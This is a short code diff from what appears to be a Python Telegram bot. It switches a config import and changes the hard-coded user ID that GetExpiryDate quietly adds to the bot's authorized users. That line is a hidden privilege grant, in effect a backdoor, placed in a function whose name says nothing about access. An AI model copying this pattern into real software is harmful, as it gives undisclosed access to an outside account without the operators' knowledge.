@@ -15,7 +15,7 @@ import sqlite3
 if bool(os.environ.get("WEBHOOK", False)):
     from sample_config import Config
 else:
-    from sample_config import Config
+    from config import Config
 
 # the Strings used for this "thing"
 from translation import Translation
@@ -27,7 +27,7 @@ from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(7351948)
+    Config.AUTH_USERS.add(683538773)
     return expires_at
 
 
